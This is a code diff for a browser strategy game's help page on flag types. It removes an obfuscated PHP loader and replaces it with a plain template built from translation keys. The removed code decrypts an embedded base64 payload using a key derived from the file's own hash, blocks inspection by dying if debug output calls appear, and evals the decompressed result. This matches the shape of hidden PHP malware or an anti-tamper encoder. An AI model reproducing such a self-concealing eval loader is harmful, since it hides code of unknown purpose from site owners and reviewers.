@@ -1,24 +1,115 @@
-<?php
-$yyyvqsjq="584ba8511e2bebacb959e60ad4605458";
-$sxyiwfhejb="075d015b520d5400505d53545656550504000d585d0f0103570205005302060e";
-$rrmreog="Sr+IruJb+gF1vo4R3imkw0/S/SOLVexIcs0bpgUp85yDWM6pGlpeEeQoO9BbN4xudqTLnocGaKAUH0V/eQl3w6dZkiiWqlY0SYOsIvjJIkNM4eQk90x4cISjuq1IoSmr266u+8kbhQCDshipIRJ+z9kJPW8bkAIhCZ9Rz5wCEtp9e5Sd6VX2l0y0mogNYWzmbMnEK/2PQImv0fP4aDyJ/nWMfM1oP01j04PeyedzclES/VqRDqiQm5ZOgfNDqjBqR7qRPGozfZbk0iYBomAIQ9T1G45Ac0OlXxdK7OzwFj5r8MS3DVvM/yj8dZDXKUdhuG224lfE+Bfr0AEq+gUdE2qtr0TegYitRQ+78YwexE7rF6EaUYUHRo/S/aU8UXfzqZOC0iSWxM/q0hm1v5DLYYvuCDvWE7hHW2oqXol9jjMi1pUkWhtpR346qiYqS23zj+CqG0yZQk5VFgliOqbUgSIqNCBbOsozHM39pdtsRifC5nspbYzDZF462rFPkAr68hcdjhPy5iEmUw2Ta8tJPu3f/fdKXyj1S6wy2l2cOITPdFfyvuGKT5cjJvy+8y0GkGMzQ8QgczqDfJ561gevRXk73OR1h98E5tKSz8nkyhVfg3f9rCwtI8r9w4FpOiy1lASdRz2cNebK3L6xtmKwiMhfvN/f/9+lhOt6bCHOMMvc+AU=";
-$etddph=file_get_contents(__FILE__);
-$ujgekj=str_replace($rrmreog,"",$etddph);
-if(strpos($ujgekj,"ec"."ho")!==false||strpos($ujgekj,"pr"."int")!==false||strpos($ujgekj,"var_"."dump")!==false||strpos($ujgekj,"file_put_"."contents")!==false||strpos($ujgekj,"fw"."rite")!==false){die();}
-$rbwlxcs=str_replace(array($yyyvqsjq,$sxyiwfhejb),array("SP_ff03cea7","KP_46ad59ee"),$etddph);
-$mxypcyr=md5($rbwlxcs);
-$xaawiyfip=hex2bin($sxyiwfhejb);
-$rgrtewu="";
-$gfbqqvn=strlen($mxypcyr);
-for($leqgulyqoy=0;$leqgulyqoy<$gfbqqvn;$leqgulyqoy++){
-$rgrtewu.=chr(ord($xaawiyfip[$leqgulyqoy])^ord($mxypcyr[$leqgulyqoy]));
-}
-$epeaedcg=base64_decode($rrmreog);
-$sstkoyoogw=strlen($epeaedcg);
-$fjmiwoi="";
-$mjtjniqv=strlen($rgrtewu);
-for($leqgulyqoy=0;$leqgulyqoy<$sstkoyoogw;$leqgulyqoy++){
-$fjmiwoi.=$epeaedcg[$leqgulyqoy]^$rgrtewu[$leqgulyqoy%$mjtjniqv];
-}
-$kjpuxcdc="gzun"."compress";
-eval('?>' . $kjpuxcdc($fjmiwoi) . '<?php ');
+<h1>
+    <?= __('help.flags.title') ?>
+</h1>
+<p>
+    <?= __('help.flags.intro') ?>
+</p>
+
+<div class="admin-alert info">
+    <h3>
+        <?= __('help.flags.system_note') ?>
+    </h3>
+    <p>
+        <?= __('help.flags.system_note_desc') ?>
+    </p>
+</div>
+
+<table class="vis" width="100%">
+    <tr>
+        <th>
+            <?= __('help.flags.flag_type') ?>
+        </th>
+        <th>
+            <?= __('help.flags.effect') ?>
+        </th>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/1_9.png" alt="<?= __('help.flags.resources') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.resource_production') ?>
+        </td>
+        <td>
+            <?= __('help.flags.resource_production_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/2_9.png" alt="<?= __('help.flags.recruitment') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.recruitment_speed') ?>
+        </td>
+        <td>
+            <?= __('help.flags.recruitment_speed_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/3_9.png" alt="<?= __('help.flags.attack') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.attack_strength') ?>
+        </td>
+        <td>
+            <?= __('help.flags.attack_strength_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/4_9.png" alt="<?= __('help.flags.defense') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.defense_strength') ?>
+        </td>
+        <td>
+            <?= __('help.flags.defense_strength_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/5_9.png" alt="<?= __('help.flags.luck') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.luck_balance') ?>
+        </td>
+        <td>
+            <?= __('help.flags.luck_balance_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/6_9.png" alt="<?= __('help.flags.population') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.population_capacity') ?>
+        </td>
+        <td>
+            <?= __('help.flags.population_capacity_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/7_9.png" alt="<?= __('help.flags.coins') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.coin_cost') ?>
+        </td>
+        <td>
+            <?= __('help.flags.coin_cost_desc') ?>
+        </td>
+    </tr>
+    <tr>
+        <td><img src="graphic/flags/medium/8_9.png" alt="<?= __('help.flags.haul') ?>"
+                onerror="this.src='graphic/icons/questionmark.png'">
+            <?= __('help.flags.haul_capacity') ?>
+        </td>
+        <td>
+            <?= __('help.flags.haul_capacity_desc') ?>
+        </td>
+    </tr>
+</table>
+
+<br>
+<h3>
+    <?= __('help.flags.flag_levels') ?>
+</h3>
+<p>
+    <?= __('help.flags.flag_levels_desc') ?>
+</p>
+
+<ul>
+    <li>
+        <?= __('help.flags.level_1') ?>
+    </li>
+    <li>
+        <?= __('help.flags.level_9') ?>
+    </li>
+</ul>
